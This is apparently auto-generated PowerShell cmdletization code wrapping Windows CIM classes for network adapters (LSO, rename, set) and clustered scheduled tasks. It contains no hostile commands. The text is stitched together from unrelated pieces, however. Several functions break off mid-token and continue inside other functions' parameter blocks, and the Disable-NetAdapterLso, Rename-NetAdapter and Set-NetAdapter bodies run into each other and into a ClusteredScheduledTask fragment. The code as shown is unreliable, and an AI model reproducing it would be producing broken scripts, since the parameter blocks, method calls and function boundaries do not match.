Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Enable-NetAdapterLso' -Alias '*'
  

function Disable-NetAdapterLso
{
[CmdletBinding(DefaultParameterSetName='ByName', SupportsShouldProcess=$true, 
ConfirmImpact='Medium', PositionalBinding=$false)]

[OutputType([Microsoft.Management.Infrastructure.CimInstance])]
param(

[Parameter(ParameterSetName='ByName', Mandatory=$true, Position=0, 
ValueFromPipelineByPropertyName=$true)]
[Alias('ifAlias','InterfaceAlias')]
[ValidateNotNull()]
[string[]]
${Name},

[Parameter(ParameterSetName='ByInstanceID', Mandatory=$true, 
ValueFromPipelineByPropertyName=$true)]
[Alias('ifDesc','InstanceID')]
[ValidateNotNull()]
[string[]]
${InterfaceDescription},

[Parameter(ParameterSetName='ByName')]
[Parameter(ParameterSetName='ByInstanceID')]
[switch]
${IncludeHidden},

[Parameter(ParameterSetName='InputObject (cdxml)', Mandatory=$true, 
ValueFromPipeline=$true)]
[PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_NetAdapterLsoSettin
gData')]
[ValidateNotNull()]
[ciminstance[]]
${InputObject},

[Parameter(ParameterSetName='ByName')]
[Parameter(ParameterSetName='ByInstanceID')]
[Parameter(ParameterSetName='InputObject (cdxml)')]
[ValidateNotNull()]
[ValidateNotNullOrEmpty()]
[switch]
${IPv4},

[Parameter(ParameterSetName='ByName')]
[Parameter(ParameterSetName='ByInstanceID')]
[Parameter(ParameterSetName='InputObject (cdxml)')]
[ValidateNotNull()]
[ValidateNotNullOrEmpty()]
[switch]
${IPv6},

[Parameter(ParameterSetName='ByName')]
[Parameter(ParameterSetName='ByInstanceID')]
[Parameter(ParameterSetName='InputObject (cdxml)')]
[switch]
${NoRestart},

[Parameter(ParameterSetName='ByName')]
[Parameter(ParameterSetName='ByInstanceID')]
[Parameter(ParameterSetName='InputObject (cdxml)')]
[switch]
${PassThru},

[Parameter(ParameterSetName='ByName')]
[Parameter(ParameterSetName='ByInstanceID')]
[Parameter(ParameterSetName='InputObject (cdxml)')]
[Alias('Session')]
[ValidateNotNullOrEmpty()]
[CimSession[]]
${CimSession},

[Parameter(ParameterSetName='ByName')]
[Parameter(ParameterSetName='ByInstanceID')]
[Parameter(ParameterSetName='InputObject (cdxml)')]
[int]
${ThrottleLimit},

[Parameter(ParameterSetName='ByName')]
[Parameter(ParameterSetName='ByInstanceID')]
[Parameter(ParameterSetName='InputObject (cdxml)')]
[switch]
${AsJob})

DynamicParam {
  try 
  {
      if (-not $__cmdletization_exceptionHasBeenThrown)
      {
          $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
          $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, 
$script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

          if ($__cmdletization_objectModelWrapper -is 
[System.Management.Automation.IDynamicParameters])
          {
              ([System.Management.Automation.IDynamicParameters]$__cmdletization_ob
jectModelWrapper).GetDynamicParameters()
          }
      }
  }
  catch
  {
      $__cmdletization_exceptionHasBeenThrown = $true
      throw
  }
}

Begin {
  $__cmdletization_exceptionHasBeenThrown = $false
  try 
  {
      __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper 
$PSBoundParameters
      $__cmdletization_objectModelWrapper.BeginProcessing()
  }
  catch
  {
      $__cmdletization_exceptionHasBeenThrown = $true
      throw
  }
}
  

Process {
  try 
  {
      if (-not $__cmdletization_exceptionHasBeenThrown)
      {
$__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder()
if ($PSBoundParameters.ContainsKey('Name') -and (@('ByName') -contains 
$PSCmdlet.ParameterSetName )) {
  $__cmdletization_values = @(${Name})
  $__cmdletization_queryBuilder.FilterByProperty('Name', $__cmdletization_values, 
$true, 'Default')
}
if ($PSBoundParameters.ContainsKey('InterfaceDescription') -and (@('ByInstanceID') 
-contains $PSCmdlet.ParameterSetName )) {
  $__cmdletization_values = @(${InterfaceDescription})
  $__cmdletization_queryBuilder.FilterByProperty('InterfaceDescription', 
$__cmdletization_values, $true, 'Default')
}
if ($PSBoundParameters.ContainsKey('IncludeHidden') -and (@('ByName', 
'ByInstanceID') -contains $PSCmdlet.ParameterSetName )) {
$__cmdletization_queryBuilder.AddQueryOption('IncludeHidden', ${IncludeHidden})
}


$__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerS
hell.Cmdletization.MethodParameter]]::new()
switch -exact ($PSCmdlet.ParameterSetName) { 
  { @('ByName', 'ByInstanceID', 'InputObject (cdxml)') -contains $_ } {
    [object]$__cmdletization_defaultValue = $null
    [object]$__cmdletization_defaultValueIsPresent = $false
    if ($PSBoundParameters.ContainsKey('IPv4')) {
      [object]$__cmdletization_value = ${IPv4}
      $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'IPv4'; ParameterType = 
'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = 
$__cmdletization_value; IsValuePresent = $true}
    } else {
      $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'IPv4'; ParameterType = 
'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = 
$__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
    }
    $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

    [object]$__cmdletization_defaultValue = $null
    [object]$__cmdletization_defaultValueIsPresent = $false
    if ($PSBoundParameters.ContainsKey('IPv6')) {
      [object]$__cmdletization_value = ${IPv6}
      $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'IPv6'; ParameterType = 
'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = 
$__cmdletization_value; IsValuePresent = $true}
    } else {
      $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'IPv6'; ParameterType = 
'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = 
$__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
    }
    $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

    [object]$__cmdletization_defaultValue = $null
    [object]$__cmdletization_defaultValueIsPresent = $false
    if ($PSBoundParameters.ContainsKey('NoRestart')) {
      [object]$__cmdletization_value = ${NoRestart}
      $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 
'cim:OperationOption:NoRestart'; ParameterType = 
'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = 
$__cmdletization_value; IsValuePresent = $true}
    } else {
      $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 
'cim:OperationOption:NoRestart'; ParameterType = 
'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = 
$__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
    }
    $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

    [object]$__cmdletization_defaultValue = $null
    [object]$__cmdletization_defaultValueIsPresent = $false
    if ($PSBoundParameters.ContainsKey('PassThru')) {
      [object]$__cmdletization_value = ${PassThru}
      $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 
'cim:OperationOption:PassThru'; ParameterType = 
'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = 
$__cmdletization_value; IsValuePresent = $true}
    } else {
      $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 
'cim:OperationOption:PassThru'; ParameterType = 
'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = 
$__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
    }
    $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

    [object]$__cmdletization_defaultValue = $null
    [object]$__cmdletization_defaultValueIsPresent = $false
      $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CmdletOutput'; 
ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'Out'; 
Value = $__cmdletization_defaultValue; IsValuePresent = 
$__cmdletization_defaultValueIsPresent}
    $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

$__cmdletization_returnValue = $null
$__cmdletization_methodInvocationInfo = 
[Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('Disable', 
$__cmdletization_methodParameters, $__cmdletization_returnValue)
$__cmdletization_passThru = $false
      if ($PSBoundParameters.ContainsKey('InputObject')) {
          foreach ($x in $InputObject) { 
$__cmdletization_objectModelWrapper.ProcessRecord($x, 
$__cmdletization_methodInvocationInfo, $__cmdletization_PassThru) }
      } else {
          
$__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder, 
$__cmdletization_methodInvocationInfo, $__cmdletization_PassThru)
      }
  }
}

      }
  }
  catch
  {
      $__cmdletization_ex
me='ByInstanceID')]
[Parameter(ParameterSetName='InputObject (cdxml)')]
[int]
${ThrottleLimit},

[Parameter(ParameterSetName='ByName')]
[Parameter(ParameterSetName='ByInstanceID')]
[Parameter(ParameterSetName='InputObject (cdxml)')]
[switch]
${AsJob})

DynamicParam {
  try 
  {
      if (-not $__cmdletization_exceptionHasBeenThrown)
      {
          $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
          $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, 
$script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

          if ($__cmdletization_objectModelWrapper -is 
[System.Management.Automation.IDynamicParameters])
          {
              ([System.Management.Automation.IDynamicParameters]$__cmdletization_ob
jectModelWrapper).GetDynamicParameters()
          }
      }
  }
  catch
  {
      $__cmdletization_exceptionHasBeenThrown = $true
      throw
  }
}

Begin {
  $__cmdletization_exceptionHasBeenThrown = $false
  try 
  {
      __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper 
$PSBoundParameters
      $__cmdletization_objectModelWrapper.BeginProcessing()
  }
  catch
  {
      $__cmdletization_exceptionHasBeenThrown = $true
      throw
  }
}
  

Process {
  try 
  {
      if (-not $__cmdletization_exceptionHasBeenThrown)
      {
$__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder()
if ($PSBoundParameters.ContainsKey('Name') -and (@('ByName') -contains 
$PSCmdlet.ParameterSetName )) {
  $__cmdletization_values = @(${Name})
  $__cmdletization_queryBuilder.FilterByProperty('Name', $__cmdletization_values, 
$true, 'Default')
}
if ($PSBoundParameters.ContainsKey('InterfaceDescription') -and (@('ByInstanceID') 
-contains $PSCmdlet.ParameterSetName )) {
  $__cmdletization_values = @(${InterfaceDescription})
  $__cmdletization_queryBuilder.FilterByProperty('InterfaceDescription', 
$__cmdletization_values, $true, 'Default')
}
if ($PSBoundParameters.ContainsKey('IncludeHidden') -and (@('ByName', 
'ByInstanceID') -contains $PSCmdlet.ParameterSetName )) {
$__cmdletization_queryBuilder.AddQueryOption('IncludeHidden', ${IncludeHidden})
}


$__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerS
hell.Cmdletization.MethodParameter]]::new()
switch -exact ($PSCmdlet.ParameterSetName) { 
  { @('ByName', 'ByInstanceID', 'InputObject (cdxml)') -contains $_ } {
    [object]$__cmdletization_defaultValue = $null
    [object]$__cmdletization_defaultValueIsPresent = $false
    if ($PSBoundParameters.ContainsKey('PassThru')) {
      [object]$__cmdletization_value = ${PassThru}
      $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 
'cim:OperationOption:PassThru'; ParameterType = 
'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = 
$__cmdletization_value; IsValuePresent = $true}
    } else {
      $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 
'cim:OperationOption:PassThru'; ParameterType = 
'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = 
$__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
    }
    $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

    [object]$__cmdletization_defaultValue = $null
    [object]$__cmdletization_defaultValueIsPresent = $false
    if ($PSBoundParameters.ContainsKey('NewName')) {
      [object]$__cmdletization_value = ${NewName}
      $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'NewName'; ParameterType = 
'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
    } else {
      $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'NewName'; ParameterType = 
'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent 
= $__cmdletization_defaultValueIsPresent}
    }
    $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

    [object]$__cmdletization_defaultValue = $null
    [object]$__cmdletization_defaultValueIsPresent = $false
      $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CmdletOutput'; 
ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'Out'; 
Value = $__cmdletization_defaultValue; IsValuePresent = 
$__cmdletization_defaultValueIsPresent}
    $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

$__cmdletization_returnValue = $null
$__cmdletization_methodInvocationInfo = 
[Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('Rename', 
$__cmdletization_methodParameters, $__cmdletization_returnValue)
$__cmdletization_passThru = $false
      if ($PSBoundParameters.ContainsKey('InputObject')) {
          foreach ($x in $InputObject) { 
$__cmdletization_objectModelWrapper.ProcessRecord($x, 
$__cmdletization_methodInvocationInfo, $__cmdletization_PassThru) }
      } else {
          
$__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder, 
$__cmdletization_methodInvocationInfo, $__cmdletization_PassThru)
      }
  }
}

      }
  }
  catch
  {
      $__cmdletization_exceptionHasBeenThrown = $true
      throw
  }
}
  

End {
  try
  {
      if (-not $__cmdletization_exceptionHasBeenThrown)
      {
          $__cmdletization_objectModelWrapper.EndProcessing()
      }
  }
  catch
  {
      throw
  }
}

# .EXTERNALHELP MSFT_NetAdapter.cmdletDefinition.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Rename-NetAdapter' -Alias '*'
  

function Set-NetAdapter
{
[CmdletBinding(DefaultParameterSetName='ByName', SupportsShouldProcess=$true, 
ConfirmImpact='High', PositionalBinding=$false)]

[OutputType([Microsoft.Management.Infrastructure.CimInstance])]
[OutputType('Microsoft.Management.Infrastructure.CimInstance#ROOT/StandardCimv2/MSFT_NetA
dapter')]

param(

[Parameter(ParameterSetName='ByName', Mandatory=$true, Position=0)]
[Alias('ifAlias','InterfaceAlias')]
[ValidateNotNull()]
[string[]]
${Name},

[Parameter(ParameterSetName='ByInstanceID', Mandatory=$true, 
ValueFromPipelineByPropertyName=$true)]
[Alias('ifDesc')]
[ValidateNotNull()]
[string[]]
${InterfaceDescription},

[Parameter(ParameterSetName='ByName')]
[Parameter(ParameterSetName='ByInstanceID')]
[switch]
${IncludeHidden},

[Parameter(ParameterSetName='InputObject (cdxml)', Mandatory=$true, 
ValueFromPipeline=$true)]
[PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_NetAdapter')]
[ValidateNotNull()]
[ciminstance[]]
${InputObject},

[Parameter(ParameterSetName='ByName')]
[Parameter(ParameterSetName='ByInstanceID')]
[Parameter(ParameterSetName='InputObject (cdxml)')]
[ValidateNotNull()]
[ValidateNotNullOrEmpty()]
[ValidateRange(0, 4094)]
[uint16]
${VlanID},

[Parameter(ParameterSetName='ByName')]
[Parameter(ParameterSetName='ByInstanceID')]
[Parameter(ParameterSetName='InputObject (cdxml)')]
[Alias('LinkLayerAddress')]
[string]
${MacAddress},

[Parameter(ParameterSetName='ByName')]
[Parameter(ParameterSetName='ByInstanceID')]
[Parameter(ParameterSetName='InputObject (cdxml)')]
[switch]
${NoRestart},

[Parameter(ParameterSetName='ByName')]
[Parameter(ParameterSetName='ByInstanceID')]
[Parameter(ParameterSetName='InputObject (cdxml)')]
[Alias('Session')]
[ValidateNotNullOrEmpty()]
[CimSession[]]
${CimSession},

[Parameter(ParameterSetName='ByName')]
[Parameter(ParameterSetName='ByInstanceID')]
[Parameter(ParameterSetName='InputObject (cdxml)')]
[int]
${ThrottleLimit},

[Parameter(ParameterSetName='ByName')]
[Parameter(ParameterSetName='ByInstanceID')]
[Parameter(ParameterSetName='InputObject (cdxml)')]
[switch]
${AsJob},

[Parameter(ParameterSetName='ByName')]
[Parameter(ParameterSetName='ByInstanceID')]
[Parameter(ParameterSetName='InputObject (cdxml)')]
[switch]
${PassThru})

DynamicParam {
  try 
  {
      if (-not $__cmdletization_exceptionHasBeenThrown)
      {
          $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
          $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, 
$script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

          if ($__cmdletization_objectModelWrapper -is 
[System.Management.Automation.IDynamicParameters])
          {
              ([System.Management.Automation.IDynamicParameters]$__cmdletization_ob
jectModelWrapper).GetDynamicParameters()
          }
      }
  }
  catch
  {
      $__cmdletization_exceptionHasBeenThrown = $true
      throw
  }
}

Begin {
  $__cmdletization_exceptionHasBeenThrown = $false
  try 
  {
      __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper 
$PSBoundParameters
      $__cmdletization_objectModelWrapper.BeginProcessing()
  }
  catch
  {
      $__cmdletization_exceptionHasBeenThrown = $true
      throw
  }
}
  

Process {
  try 
  {
      if (-not $__cmdletization_exceptionHasBeenThrown)
      {
$__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder()
if ($PSBoundParameters.ContainsKey('Name') -and (@('ByName') -contains 
$PSCmdlet.ParameterSetName )) {
  $__cmdletization_values = @(${Name})
  $__cmdletization_queryBuilder.FilterByProperty('Name', $__cmdletization_values, 
$true, 'Default')
}
if ($PSBoundParameters.ContainsKey('InterfaceDescription') -and (@('ByInstanceID') 
-contains $PSCmdlet.ParameterSetName )) {
  $__cmdletization_values = @(${InterfaceDescription})
  $__cmdletization_queryBuilder.FilterByProperty('InterfaceDescription', 
$__cmdletization_values, $true, 'Default')
}
if ($PSBoundParameters.ContainsKey('IncludeHidden') -and (@('ByName', 
'ByInstanceID') -contains $PSCmdlet.ParameterSetName )) {
$__cmdletization_queryBuilder.AddQueryOption('IncludeHidden', ${IncludeHidden})
}


$__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerS
hell.Cmdletization.MethodParameter]]::new()
switch -exact ($PSCmdlet.ParameterSetName) { 
  { @('ByName', 'ByInstanceID', 'InputObject (cdxml)') -contains $_ } {
    [object]$__cmdletization_defaultValue = $null
    [object]$__cmdletization_defaultValueIsPresent = $false
      $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'NetworkAddresses'; 
ParameterType = 'System.String[]'; Bindings = '0'; Value = 
$__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
    $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

    [object]$__cmdletization_defaultValue = $null
    [object]$__cmdletization_defaultValueIsPresent = $false
    if ($PSBoundParameters.ContainsKey('VlanID')) {
      [object]$__cmdletization_value = ${VlanID}
      $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'VlanID'; ParameterType = 
'System.UInt16'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
    } else {
      $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'VlanID'; ParameterType = 
'System.UInt16'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent 
= $__cmdletization_defaultValueIsPresent}
    }
    $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

    [object]$__cmdletization_defaultValue = $null
    [object]$__cmdletization_defaultValueIsPresent = $false
    if ($PSBoundParameters.ContainsKey('MacAddress')) {
      [object]$__cmdletization_value = ${MacAddress}
      $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 
'cim:OperationOption:MacAddress'; ParameterType = 'System.String'; Bindings = 'In'; 
Value = $__cmdletization_value; IsValuePresent = $true}
    } else {
      $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 
'cim:OperationOption:MacAddress'; ParameterType = 'System.String'; Bindings = 'In'; 
Value = $__cmdletization_defaultValue; IsValuePresent = 
$__cmdletization_defaultValueIsPresent}
    }
    $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

    [object]$__cmdletization_defaultValue = $null
    [object]$__cmdletization_defaultValueIsPresent = $false
    if ($PSBoundParameters.ContainsKey('NoRestart')) {
      [object]$__cmdletization_value = ${NoRestart}
      $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 
'cim:OperationOption:NoRestart'; ParameterType = 
'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = 
$__cmdletization_value; IsValuePresent = $true}
    } else {
      $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 
'cim:OperationOption:NoRestart'; ParameterType = 
'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = 
$__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
    }
    $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

$__cmdletization_returnValue = $null
$__cmdletization_methodInvocationInfo = 
[Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('cim:ModifyInstance', 
$__cmdletization_methodParamet
ft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskName'; ParameterType = 
'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
  } else {
    $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskName'; ParameterType = 
'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent 
= $__cmdletization_defaultValueIsPresent}
  }
  $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

  [object]$__cmdletization_defaultValue = $null
  [object]$__cmdletization_defaultValueIsPresent = $false
    $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CmdletOutput'; 
ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'Out'; 
Value = $__cmdletization_defaultValue; IsValuePresent = 
$__cmdletization_defaultValueIsPresent}
  $__cmdletization_methodParameter.ParameterTypeName = 
'Microsoft.Management.Infrastructure.CimInstance#MSFT_ClusteredScheduledTask'
  $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

$__cmdletization_returnValue = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; 
ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = 
$false }
$__cmdletization_methodInvocationInfo = 
[Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('SetByXml', 
$__cmdletization_methodParameters, $__cmdletization_returnValue)

$__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)
  }
}

      }
  }
  catch
  {
      $__cmdletization_exceptionHasBeenThrown = $true
      throw
  }
}
  

End {
  try
  {
      if (-not $__cmdletization_exceptionHasBeenThrown)
      {
          $__cmdletization_objectModelWrapper.EndProcessing()
      }
  }
  catch
  {
      throw
  }
}

# .EXTERNALHELP PS_ClusteredScheduledTask_v1.0.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Set-ClusteredScheduledTask' 
-Alias '*'
  

function Unregister-ClusteredScheduledTask
{
[CmdletBinding(PositionalBinding=$false)]


param(

[Parameter(ParameterSetName='Name', Position=1)]
[ValidateNotNull()]
[ValidateNotNullOrEmpty()]
[string]
${Cluster},

[Parameter(ParameterSetName='Name', Mandatory=$true, Position=0)]
[ValidateNotNull()]
[ValidateNotNullOrEmpty()]
[string]
${TaskName},

[Parameter(ParameterSetName='Object', Position=0, ValueFromPipeline=$true)]
[PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_ClusteredScheduledT
ask')]
[ValidateNotNull()]
[ValidateNotNullOrEmpty()]
[ciminstance]
${InputObject},

[Parameter(ParameterSetName='Name')]
[Parameter(ParameterSetName='Object')]
[Alias('Session')]
[ValidateNotNullOrEmpty()]
[CimSession[]]
${CimSession},

[Parameter(ParameterSetName='Name')]
[Parameter(ParameterSetName='Object')]
[int]
${ThrottleLimit},

[Parameter(ParameterSetName='Name')]
[Parameter(ParameterSetName='Object')]
[switch]
${AsJob})

DynamicParam {
  try 
  {
      if (-not $__cmdletization_exceptionHasBeenThrown)
      {
          $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
          $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, 
$script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

          if ($__cmdletization_objectModelWrapper -is 
[System.Management.Automation.IDynamicParameters])
          {
              ([System.Management.Automation.IDynamicParameters]$__cmdletization_ob
jectModelWrapper).GetDynamicParameters()
          }
      }
  }
  catch
  {
      $__cmdletization_exceptionHasBeenThrown = $true
      throw
  }
}

Begin {
  $__cmdletization_exceptionHasBeenThrown = $false
  try 
  {
      __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper 
$PSBoundParameters
      $__cmdletization_objectModelWrapper.BeginProcessing()
  }
  catch
  {
      $__cmdletization_exceptionHasBeenThrown = $true
      throw
  }
}
  

Process {
  try 
  {
      if (-not $__cmdletization_exceptionHasBeenThrown)
      {
$__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.Powe
rShell.Cmdletization.MethodParameter]]::new()

switch -exact ($PSCmdlet.ParameterSetName) { 
  { @('Name') -contains $_ } {
  [object]$__cmdletization_defaultValue = $null
  [object]$__cmdletization_defaultValueIsPresent = $false
  if ($PSBoundParameters.ContainsKey('Cluster')) {
    [object]$__cmdletization_value = ${Cluster}
    $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Cluster'; ParameterType = 
'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
  } else {
    $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Cluster'; ParameterType = 
'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent 
= $__cmdletization_defaultValueIsPresent}
  }
  $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

  [object]$__cmdletization_defaultValue = $null
  [object]$__cmdletization_defaultValueIsPresent = $false
  if ($PSBoundParameters.ContainsKey('TaskName')) {
    [object]$__cmdletization_value = ${TaskName}
    $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskName'; ParameterType = 
'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
  } else {
    $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskName'; ParameterType = 
'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent 
= $__cmdletization_defaultValueIsPresent}
  }
  $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

$__cmdletization_returnValue = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; 
ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = 
$false }
$__cmdletization_methodInvocationInfo = 
[Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('UnregisterByName', 
$__cmdletization_methodParameters, $__cmdletization_returnValue)

$__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)
  }
  { @('Object') -contains $_ } {
  [object]$__cmdletization_defaultValue = $null
  [object]$__cmdletization_defaultValueIsPresent = $false
  if ($PSBoundParameters.ContainsKey('InputObject')) {
    [object]$__cmdletization_value = ${InputObject}
    $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'InputObject'; 
ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'In'; 
Value = $__cmdletization_value; IsValuePresent = $true}
  } else {
    $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'InputObject'; 
ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'In'; 
Value = $__cmdletization_defaultValue; IsValuePresent = 
$__cmdletization_defaultValueIsPresent}
  }
  $__cmdletization_methodParameter.ParameterTypeName = 
'Microsoft.Management.Infrastructure.CimInstance#MSFT_ClusteredScheduledTask'
  $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

$__cmdletization_returnValue = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; 
ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = 
$false }
$__cmdletization_methodInvocationInfo = 
[Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('UnregisterByObject', 
$__cmdletization_methodParameters, $__cmdletization_returnValue)

$__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)
  }
}

      }
  }
  catch
  {
      $__cmdletization_exceptionHasBeenThrown = $true
      throw
  }
}
  

End {
  try
  {
      if (-not $__cmdletization_exceptionHasBeenThrown)
      {
          $__cmdletization_objectModelWrapper.EndProcessing()
      }
  }
  catch
  {
      throw
  }
